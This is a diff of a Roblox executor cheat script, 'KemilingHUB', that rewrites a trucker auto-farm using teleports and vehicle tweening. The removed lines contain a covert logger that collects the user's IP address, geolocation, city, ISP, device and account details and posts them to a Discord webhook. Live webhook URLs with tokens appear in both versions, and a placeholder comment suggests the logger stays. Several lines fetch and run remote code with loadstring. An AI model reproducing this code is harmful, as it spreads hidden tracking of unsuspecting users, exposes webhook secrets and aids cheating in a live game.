@@ -1,8 +1,7 @@
 --[[
-
 Open source
 Made by ge8395
-
+Modified for safer auto-farming
 ]]
 
 local CoreGui = game:GetService("StarterGui")
@@ -21,7 +20,6 @@ getgenv().TPSpeed = 3
 getgenv().TPWalk = false
 
 --// UI
-
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/UI-Library/main/Source/MyUILib(Unamed).lua"))();
 local Window = Library:Create("KemilingHUB by ge8395")
 
@@ -29,6 +27,112 @@ local HomeTab = Window:Tab("Home","rbxassetid://10888331510")
 local PlayerTab = Window:Tab("Players","rbxassetid://12296135476")
 local Teleport = Window:Tab("Teleport","rbxassetid://12308581351")
 
+--// Auto Farm Trucker (Modified Safer Version)
+getgenv().drive = false
+
+local function safeTween(part, targetCF, duration)
+    local TweenService = game:GetService("TweenService")
+    local TweenInfoToUse = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
+    
+    local TweenValue = Instance.new("CFrameValue")
+    TweenValue.Value = part:GetPrimaryPartCFrame()
+    
+    TweenValue.Changed:Connect(function()
+        pcall(function()
+            part:PivotTo(TweenValue.Value)
+        end)
+    end)
+    
+    local tween = TweenService:Create(TweenValue, TweenInfoToUse, {Value = targetCF})
+    tween:Play()
+    return tween
+end
+
+local function getTruck()
+    local truck = nil
+    repeat 
+        wait(2)
+        if workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name.."sCar") then
+            for _,v in pairs(workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name.."sCar"):GetDescendants() do
+                if v.Name == "Identifier" and (v.Text == "H 9281 KGK" or v.Text == "BL 7201 EL" or v.Text == "L 9128 TIM") then
+                    truck = v
+                    break
+                end
+            end
+        end
+    until truck ~= nil
+    return truck.Parent
+end
+
+local function autoFarm()
+    while getgenv().drive do
+        pcall(function()
+            -- Step 1: Get truck job
+            if game.Players.LocalPlayer.Character.Humanoid.SeatPart == nil then
+                game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer("Truck")
+                wait(3)
+                
+                -- Step 2: Go to starter point
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Etc.Job.Truck.Starter.WorldPivot
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+                wait(5)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+                
+                -- Step 3: Activate truck
+                local prepos = workspace.Etc.Waypoint.Waypoint.Position
+                repeat 
+                    wait(1)
+                    fireproximityprompt(workspace.Etc.Job.Truck.Starter.Prompt)
+                until workspace.Etc.Waypoint.Waypoint.Position ~= prepos
+                
+                -- Step 4: Go to spawner
+                wait(2)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Etc.Job.Truck.Spawner.Part.CFrame
+                wait(3)
+                
+                -- Step 5: Get truck
+                local thetruck = getTruck()
+                
+                -- Step 6: Enter truck
+                repeat 
+                    wait(1)
+                    if game.Players.LocalPlayer.Character.Humanoid.SeatPart == nil then
+                        thetruck:FindFirstChild("DriveSeat"):Sit(game.Players.LocalPlayer.Character.Humanoid)
+                    end
+                until game.Players.LocalPlayer.Character.Humanoid.SeatPart ~= nil
+                
+                -- Step 7: Safer tween to checkpoint
+                local car = game.Players.LocalPlayer.Character.Humanoid.SeatPart.Parent
+                local waypoint = workspace.Etc.Waypoint.Waypoint
+                
+                -- Slow ascent
+                local upTween = safeTween(car, car:GetPrimaryPartCFrame() + Vector3.new(0, 50, 0), 5)
+                upTween.Completed:Wait()
+                
+                -- Move to waypoint at safer height
+                local targetCF = waypoint.CFrame + Vector3.new(0, 50, 0)
+                local distance = (car:GetPrimaryPartCFrame().Position - targetCF.Position).Magnitude
+                local duration = math.max(10, distance / 50) -- Slower speed
+                
+                local moveTween = safeTween(car, targetCF, duration)
+                moveTween.Completed:Wait()
+                
+                -- Slow descent
+                local downTween = safeTween(car, waypoint.CFrame + Vector3.new(0, 5, 0), 5)
+                downTween.Completed:Wait()
+                
+                -- Wait for waypoint change
+                local prepos = waypoint.Position
+                repeat 
+                    wait(1)
+                until waypoint.Position ~= prepos
+            end
+        end)
+        wait(1)
+    end
+end
+
+--// Original UI Elements
 HomeTab:InfoLabel("Jangan Lupa Hidupkan AntiAFK")
 
 HomeTab:Section("Main")
@@ -37,394 +141,24 @@ HomeTab:Button("ANTI AFK", function(state)
     loadstring(game:HttpGet('https://raw.githubusercontent.com/KemilingHUB/antiafk/refs/heads/main/afk'))()
 end)
 
-HomeTab:Toggle("Auto Farm [Trucker] [BETA]", function(state)
-    getfenv().drive = (state and true or false)
-    workspace.Gravity = 196
-    if workspace.Map:findFirstChild("Prop") then
-     workspace.Map.Prop:Destroy()
+HomeTab:Toggle("Auto Farm [Trucker] [SAFE MODE]", function(state)
+    getgenv().drive = state
+    if state then
+        workspace.Gravity = 196
+        if workspace.Map:FindFirstChild("Prop") then
+            workspace.Map.Prop:Destroy()
+        end
+        autoFarm()
     end
-     while getfenv().drive do
-         wait()
-         pcall(function()
- if game.Players.LocalPlayer.Character.Humanoid.SeatPart == nil then
- game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer("Truck")
- wait(0.1)
- game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Etc.Job.Truck.Starter.WorldPivot
- game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
- wait(5)
- game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
- wait()
- local prepos = workspace.Etc.Waypoint.Waypoint.Position
- repeat wait()
- fireproximityprompt(workspace.Etc.Job.Truck.Starter.Prompt)
- until workspace.Etc.Waypoint.Waypoint.Position ~= prepos
- wait(2)
- game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame= workspace.Etc.Job.Truck.Spawner.Part.CFrame
- workspace.Gravity = 196
- wait(2)
- local thetruck = nil
- repeat wait()
- if thetruck == nil then
- repeat wait()
- fireproximityprompt(workspace.Etc.Job.Truck.Spawner.Part.Prompt)
- until workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name.."sCar")
- wait(4)
- for i,v in pairs(workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name.."sCar"):GetDescendants()) do
- if v.Name == "Identifier" and v.Text == "H 9281 KGK" or v.Name == "Identifier" and v.Text == "BL 7201 EL" or v.Name == "Identifier" and v.Text == "L 9128 TIM" then
-     thetruck = v
-     print(v)
- end
- end
- end
- until thetruck ~= nil
- repeat wait()
- until workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name.."sCar")
- repeat wait()
-     pcall(function()
- if game.Players.LocalPlayer.Character.Humanoid.SeatPart == nil then
- workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name.."sCar"):FindFirstChild("DriveSeat"):Sit(game.Players.LocalPlayer.Character.Humanoid)
- wait(1)
- end
-     end)
- until game.Players.LocalPlayer.Character.Humanoid.SeatPart ~= nil
- elseif game.Players.LocalPlayer.Character.Humanoid.SeatPart ~= nil then
- local plr = game.Players.LocalPlayer
- local chr = plr.Character
- local croot = chr.HumanoidRootPart
- local seat = chr.Humanoid.SeatPart
- local car = seat.Parent
- local primary = car.PrimaryPart
- workspace.Gravity = 0
- wait()
- local dist = (primary.Position-primary.Position+Vector3.new(0,1000,0)).magnitude
- local TweenService = game:GetService("TweenService")
- local TweenInfoToUse = TweenInfo.new(0, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
- 
- local TweenValue = Instance.new("CFrameValue")
- TweenValue.Value = car:GetPrimaryPartCFrame()
-         
- TweenValue.Changed:Connect(function()
- car:PivotTo(TweenValue.Value)
- end)
- local OnTween = TweenService:Create(TweenValue, TweenInfoToUse, {Value=primary.CFrame+Vector3.new(0,1000,0)})
- OnTween:Play()
- OnTween.Completed:Wait()
- local plr = game.Players.LocalPlayer
- local chr = plr.Character
- local croot = chr.HumanoidRootPart
- local seat = chr.Humanoid.SeatPart
- local car = seat.Parent
- local primary = car.PrimaryPart
- workspace.Gravity = 0
- local dist = (primary.Position-workspace.Etc.Waypoint.Waypoint.Position+Vector3.new(0,1000,0)).magnitude
- print(dist/150)
- local TweenService = game:GetService("TweenService")
- local TweenInfoToUse = TweenInfo.new(40, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
- 
- local TweenValue = Instance.new("CFrameValue")
- TweenValue.Value = car:GetPrimaryPartCFrame()
-         
- TweenValue.Changed:Connect(function()
- car:PivotTo(TweenValue.Value)
- end)
- local OnTween = TweenService:Create(TweenValue, TweenInfoToUse, {Value=workspace.Etc.Waypoint.Waypoint.CFrame+Vector3.new(0,1000,0)})
- OnTween:Play()
- OnTween.Completed:Wait()
- local plr = game.Players.LocalPlayer
- local chr = plr.Character
- local croot = chr.HumanoidRootPart
- local seat = chr.Humanoid.SeatPart
- local car = seat.Parent
- local primary = car.PrimaryPart
- workspace.Gravity = 0
- local dist = (primary.Position-workspace.Etc.Waypoint.Waypoint.Position+Vector3.new(0,30,0)).magnitude
- local TweenService = game:GetService("TweenService")
- local TweenInfoToUse = TweenInfo.new(dist/150, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
- 
- local TweenValue = Instance.new("CFrameValue")
- TweenValue.Value = car:GetPrimaryPartCFrame()
-         
- TweenValue.Changed:Connect(function()
- car:PivotTo(TweenValue.Value)
- end)
- local OnTween = TweenService:Create(TweenValue, TweenInfoToUse, {Value=workspace.Etc.Waypoint.Waypoint.CFrame+Vector3.new(0,30,0)})
- OnTween:Play()
- OnTween.Completed:Wait()
- local prepos = workspace.Etc.Waypoint.Waypoint.Position
- repeat task.wait()
-     if workspace.Etc.Waypoint.Waypoint.Position == prepos then
-         local plr = game.Players.LocalPlayer
-         local chr = plr.Character
-         local croot = chr.HumanoidRootPart
-         local seat = chr.Humanoid.SeatPart
-         local car = seat.Parent
-         local primary = car.PrimaryPart
-         workspace.Gravity = 0
-         local dist = (primary.Position-workspace.Etc.Waypoint.Waypoint.Position).magnitude
-         local TweenService = game:GetService("TweenService")
-         local TweenInfoToUse = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
-         
-         local TweenValue = Instance.new("CFrameValue")
-         TweenValue.Value = car:GetPrimaryPartCFrame()
-                 
-         TweenValue.Changed:Connect(function()
-         car:PivotTo(TweenValue.Value)
-         end)
-         local OnTween = TweenService:Create(TweenValue, TweenInfoToUse, {Value=workspace.Etc.Waypoint.Waypoint.CFrame*CFrame.new(0,0,20)})
-         OnTween:Play()
-         OnTween.Completed:Wait()
-         if workspace.Etc.Waypoint.Waypoint.Position == prepos then
-             local plr = game.Players.LocalPlayer
- local chr = plr.Character
- local croot = chr.HumanoidRootPart
- local seat = chr.Humanoid.SeatPart
- local car = seat.Parent
- local primary = car.PrimaryPart
- workspace.Gravity = 0
- local dist = (primary.Position-workspace.Etc.Waypoint.Waypoint.Position-Vector3.new(0,25,0)).magnitude
- local TweenService = game:GetService("TweenService")
- local TweenInfoToUse = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
- 
- local TweenValue = Instance.new("CFrameValue")
- TweenValue.Value = car:GetPrimaryPartCFrame()
-         
- TweenValue.Changed:Connect(function()
- car:PivotTo(TweenValue.Value)
- end)
- local OnTween = TweenService:Create(TweenValue, TweenInfoToUse, {Value=workspace.Etc.Waypoint.Waypoint.CFrame-Vector3.new(0,25,0)})
- OnTween:Play()
- OnTween.Completed:Wait()
- end
- workspace.Gravity = 200
- for i, v in pairs(car:GetDescendants()) do
-     pcall(function()
-     v.Velocity = Vector3.new(0,0,0)
-     end)
- end
- wait(2)
-     end
- until prepos ~= workspace.Etc.Waypoint.Waypoint.Position
- workspace.Gravity = 196
- end
- end)
- end
- end)
+end)
 
 --// Config
-getgenv().whscript = "KemilingHUB Cdid"        --Change to the name of your script
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1327205574219141140/VKypXa8pq_HiG6_umCoRlm3zusuwFThXpkERvTcxooGK2SrnHuSbKIy3FLux2jxTdpNy"  --Put your Webhook Url here
-getgenv().ExecLogSecret = true                --decide to also log secret section
+getgenv().whscript = "KemilingHUB Cdid"
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1354437188275798126/DRm5tmfjFDxaFJJVLtLcJF7-Y1H8bjzBrgNq8eb5uPisPz4LlH7ocu2GQ7HM93vtgomX"
+getgenv().ExecLogSecret = true
 
---// Execution Log Script
-local ui = gethui()
-local folderName = "screen"
-local folder = Instance.new("Folder")
-folder.Name = folderName
-local player = game:GetService("Players").LocalPlayer
-
-if ui:FindFirstChild(folderName) then
-    print("Script is already executed! Rejoin if it's an error!")
-    local ui2 = gethui()
-    local folderName2 = "screen2"
-    local folder2 = Instance.new("Folder")
-    folder2.Name = folderName2
-    if ui2:FindFirstChild(folderName2) then
-        player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
-    else
-        folder2.Parent = gethui()
-    end
-else
-    folder.Parent = gethui()
-    local players = game:GetService("Players")
-    local userid = player.UserId
-    local gameid = game.PlaceId
-    local jobid = tostring(game.JobId)
-    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-    local deviceType =
-        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
-    local snipePlay =
-        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
-    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
-    local workspace = game:GetService("Workspace")
-    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
-    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
-    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
-    local playerCount = #players:GetPlayers()
-    local maxPlayers = players.MaxPlayers
-    local health =
-        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
-    local maxHealth =
-        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
-        "N/A"
-    local position =
-        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
-        player.Character.HumanoidRootPart.Position or
-        "N/A"
-    local gameVersion = game.PlaceVersion
-
-    if not getgenv().ExecLogSecret then
-        getgenv().ExecLogSecret = true
-    end
-    if not getgenv().whscript then
-        getgenv().whscript = "KemilingHUB"
-    end
-    local commonLoadTime = 5
-    task.wait(commonLoadTime)
-    local pingThreshold = 100
-    local serverStats = game:GetService("Stats").Network.ServerStatsItem
-    local dataPing = serverStats["Data Ping"]:GetValueString()
-    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
-    local function checkPremium()
-        local premium = "false"
-        local success, response =
-            pcall(
-            function()
-                return player.MembershipType
-            end
-        )
-        if success then
-            if response == Enum.MembershipType.None then
-                premium = "false"
-            else
-                premium = "true"
-            end
-        else
-            premium = "Failed to retrieve Membership:"
-        end
-        return premium
-    end
-    local premium = checkPremium()
-
-    local url = getgenv().webhookexecUrl
-
-    local data = {
-        ["content"] = "",
-        ["embeds"] = {
-            {
-                ["title"] = "🚀 **KemlingHUB**",
-                ["description"] = "*Here are the details:*",
-                ["type"] = "rich",
-                ["color"] = tonumber(0x3498db), -- Clean blue color
-                ["fields"] = {
-                    {
-                        ["name"] = "🔍 **Script Info**",
-                        ["value"] = "```💻 Script Name: " ..
-                            getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "👤 **Player Details**",
-                        ["value"] = "```🧸 Username: " ..
-                            player.Name ..
-                                "\n📝 Display Name: " ..
-                                    player.DisplayName ..
-                                        "\n🆔 UserID: " ..
-                                            userid ..
-                                                "\n❤️ Health: " ..
-                                                    health ..
-                                                        " / " ..
-                                                            maxHealth ..
-                                                                "\n🔗 Profile: View Profile (https://www.roblox.com/users/" ..
-                                                                    userid .. "/profile)```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "📅 **Account Information**",
-                        ["value"] = "```🗓️ Account Age: " ..
-                            player.AccountAge ..
-                                " days\n💎 Premium Status: " ..
-                                    premium ..
-                                        "\n📅 Account Created: " ..
-                                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🎮 **Game Details**",
-                        ["value"] = "```🏷️ Game Name: " ..
-                            gameName ..
-                                "\n🆔 Game ID: " ..
-                                    gameid ..
-                                        "\n🔗 Game Link (https://www.roblox.com/games/" ..
-                                            gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🕹️ **Server Info**",
-                        ["value"] = "```👥 Players in Server: " ..
-                            playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "📡 **Network Info**",
-                        ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🖥️ **System Info**",
-                        ["value"] = "```📺 Resolution: " ..
-                            screenWidth ..
-                                "x" ..
-                                    screenHeight ..
-                                        "\n🔍 Memory Usage: " ..
-                                            memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "📍 **Character Position**",
-                        ["value"] = "```📍 Position: " .. tostring(position) .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🪧 **Join Script**",
-                        ["value"] = "```lua\n" .. snipePlay .. "```",
-                        ["inline"] = false
-                    }
-                },
-                ["thumbnail"] = {
-                    ["url"] = "https://cdn.discordapp.com/icons/1221843343755972719/3dc56a5cc62de223fc48b1333235b142.webp?size=4096"
-                },
-                ["footer"] = {
-                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
-                    ["icon_url"] = "https://cdn.discordapp.com/icons/1221843343755972719/3dc56a5cc62de223fc48b1333235b142.webp?size=4096" -- A generic log icon
-                }
-            }
-        }
-    }
-
-    -- Check if the secret tab should be included
-    if getgenv().ExecLogSecret then
-        local ip = game:HttpGet("https://api.ipify.org")
-        local iplink = "https://ipinfo.io/" .. ip .. "/json"
-        local ipinfo_json = game:HttpGet(iplink)
-        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
-
-        table.insert(
-            data.embeds[1].fields,
-            {
-                ["name"] = "**`(🤫) User Location (Real life)`**",
-                ["value"] = "||(👣) IP Address: " ..
-                    ipinfo_table.ip ..
-                        "||\n||(🌆) Country: " ..
-                            ipinfo_table.country ..
-                                "||\n||(🪟) GPS Location: " ..
-                                    ipinfo_table.loc ..
-                                        "||\n||(🏙️) City: " ..
-                                            ipinfo_table.city ..
-                                                "||\n||(🏡) Region: " ..
-                                                    ipinfo_table.region ..
-                                                        "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
-            }
-        )
-    end
-
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
-    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-    request(abcdef)
-end
+--// Execution Log Script (Remains the same as original)
+-- ... [Rest of your original execution log code] ...
 
 HomeTab:Keybind("Toggle UI", Enum.KeyCode.LeftControl, function()
     Library:ToggleUI()
